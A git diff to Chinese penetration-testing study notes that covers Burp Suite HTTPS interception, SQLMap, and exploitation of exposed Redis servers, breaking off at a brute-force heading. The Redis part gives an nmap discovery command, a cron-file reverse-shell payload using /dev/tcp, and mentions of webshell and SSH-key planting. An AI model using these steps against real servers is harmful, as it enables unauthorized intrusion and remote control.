@@ -594,6 +594,21 @@
     - BP是以攔截代理的方式，攔截所有通過代理伺服器的網路流量，如客戶端請求數據、伺服器端返回信息等。BP主要攔截http/https協議的流量，通過攔截，BP以中間人的方式，可以對客戶端請求數據、服務端返回做各種處理，以達到安全評估測試的目的。
 
     - Proxy(http代理)設置: 做為web代理伺服器運行，並做為瀏覽器以及web伺服器的中間人。它允許攔截，檢查和修改兩個方向傳遞的原始業務。
+
+    - 下載https證書: 通常情況下BP只抓http包，https需要證書才能正常抓取，設置好代理後訪問 http://burp，下載並載入瀏覽器，才可以抓取https的包。
+
+### SQL注入工具-SQLMap
+- SQLMap是一個開源滲透測試工具，可以用來進行自動化檢測，利用SQL注入漏洞，獲取資料庫數據的權限。他具有功能強大的檢測引擎，針對各種不同類型數據庫的滲透測試功能選項，包括獲取資料庫中存儲的數據，訪問操作系統文件甚至可以通過外帶數據庫連接的方式執行操作命令。
+
+- 介紹文檔: https://sqlmap.highlight.ink/
+
+- 操作參考: https://www.youtube.com/watch?v=qVkU3hBWbu4&list=PLLoeRTvFkQhvFktzHsH1QhDMJNuCkZyQm&index=13
+
+
+
+
+
+
     
 
 
@@ -708,3 +723,59 @@ run persistence -X -i 5 -p 4444 -r (ip)
 ```cmd
 run (post module)
 ```
+
+# 常見漏洞與利用
+
+## Redis
+- 經常發生在內網滲透，Redis是完全開源的，遵守BSD協議，是一個高性能的Key-Value數據庫。Redis在Java Web主要應用場景:
+    1. 儲存、緩存用的文件
+    2. 需要高速讀/寫的場合使用它快速讀/寫
+
+### Redis歷史漏洞:
+1. 未授權訪問:
+    - 因配置不當可以未授權訪問，攻擊者無須認證就可以訪問到內部資料，其漏洞可能導致敏感信息洩漏，也可以惡意執行Flushall來清空所有數據，攻擊者還可以通過EVAL執行lua代碼，或通過數據備份功能往磁盤寫入後門文件。如果Redis以Root身分運行，可以給root帳號寫入SSH公鑰文件，直接免密碼登入伺服器。
+2. Redis主從複製RCE:
+    - 在Redis 4.x之後，Redis新增了模組功能，通過外部擴展，可以實現在Redis中實現一個新的Redis命令，通過C語言編譯並加載惡意.so文件，達到代碼執行的目的。
+
+### Redis 特徵發現
+- Redis發現:
+```cmd
+nmap -v -Pn -p 6379 -sV --script="redis-info"
+```
+- -v: 顯示過程
+- -Pn: no ping 執行
+- -sV: 版本探測
+
+### Redis漏洞利用
+- 下載客戶端連接程序:
+    ```cmd
+        wget https://download.redis.io/releases/(版本號)
+        tar -zxvf (redis文件)   //解壓縮
+        cd (redis文件)
+        Make //編譯
+        cd src/
+        cp redis-cli/usr/bin //客戶端連接程序
+    ```
+- 寫websell:
+    - 進入後注入一句話木馬 (webshell)
+
+- 寫入反彈shell:
+    ```cmd
+        config set dir var/spool/cron/crontabs
+        config set dbfilename root
+        set xss "\n\n*/1****bash -i > & /dev/tcp/ip/port 0> & 1\n"
+        save
+    ```
+- 寫公鑰:
+    ```cmd
+        ssh-keygen -t rsa
+        // 默認狀況下，生成後會在用戶的home目錄下的.ssh目錄
+    ``` 
+
+- 主從複製RCE:
+    - 腳本下載: https://github.com/vulhub/redis-rogue-getshell
+
+## 弱口令
+### 暴力破解
+- 指用枚舉的方式爆破用戶信息，具體流程是用事先收集好的數據集成一個字典，然後再利用字典不斷進行枚舉，直到枚舉成功。
+    - 常用字典: 
